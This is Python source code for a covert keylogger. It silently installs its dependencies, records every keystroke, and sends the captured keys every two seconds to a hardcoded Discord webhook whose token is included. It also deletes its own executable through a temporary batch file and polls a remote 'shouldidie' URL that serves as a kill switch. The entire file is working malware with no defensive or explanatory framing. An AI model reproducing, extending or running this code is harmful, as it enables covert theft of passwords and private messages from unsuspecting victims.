import os
import sys
import time
import threading

# --- Ensure Dependencies ---
def install_if_missing(package):
    try:
        __import__(package)
    except ImportError:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for pkg in ["pynput", "requests"]:
    install_if_missing(pkg)

# --- Imports after ensuring installation ---
import requests
from pynput import keyboard

# --- Configuration ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1360081058351153152/qt2xAqDS6h58Qwu9BxIiRRZR04Xc4SMCsxLp-rCH0eLgS5HD6lpfHLUJ64155wFSFM6r"
CHECK_URL = "http://shouldidie.fiscon.cc"

key_buffer = []
lock = threading.Lock()

# --- Self-delete logic ---
def self_delete():
    time.sleep(1)
    try:
        exe_path = os.path.abspath(sys.argv[0])
        temp_dir = os.getenv("TEMP") or "."
        bat_path = os.path.join(temp_dir, "cleanup.bat")

        with open(bat_path, 'w') as f:
            f.write(f"""@echo off
timeout /t 2 > nul
del "{exe_path}" > nul
del "%~f0" > nul
""")

        os.system(f'start /min cmd /c "{bat_path}"')
    except Exception as e:
        print("Self-delete failed:", e)

# --- Webhook sender ---
def send_webhook(content, wait_for_response=False):
    try:
        if wait_for_response:
            response = requests.post(WEBHOOK_URL, json={"content": content}, timeout=10)
            response.raise_for_status()  # Raise an error if it fails
        else:
            threading.Thread(target=lambda: requests.post(WEBHOOK_URL, json={"content": content}), daemon=True).start()
    except Exception as e:
        print("Failed to send webhook:", e)

# --- Format keys nicely ---
def format_key(key):
    try:
        return key.char  # letters/numbers
    except AttributeError:
        return str(key).replace('Key.', '').lower()  # special keys like enter, backspace

# --- Key event handler ---
def on_press(key):
    with lock:
        key_buffer.append(format_key(key))

# --- Periodic webhook sender thread ---
def message_loop():
    while True:
        time.sleep(2)
        with lock:
            if key_buffer:
                message = f"{' '.join(key_buffer)}"
                send_webhook(message)
                key_buffer.clear()

# --- Periodic shouldidie checker ---
def check_should_i_die_loop():
    while True:
        time.sleep(60)  # Check every 60 seconds
        try:
            response = requests.get(CHECK_URL, timeout=10)
            if response.status_code == 200 and response.text.strip().lower() == "yes":
                print("Should die: yes. Sending shutdown message.")
                send_webhook("Shutting down...", wait_for_response=True)  # <-- Block until sent
                os._exit(0)  # Immediate hard exit
        except Exception as e:
            print("Failed to check shouldidie:", e)

# --- Keyboard listener thread ---
def listen_keys():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --- Main execution ---
if __name__ == "__main__":
    threading.Thread(target=self_delete, daemon=True).start()
    threading.Thread(target=message_loop, daemon=True).start()
    threading.Thread(target=check_should_i_die_loop, daemon=True).start()
    listen_keys()
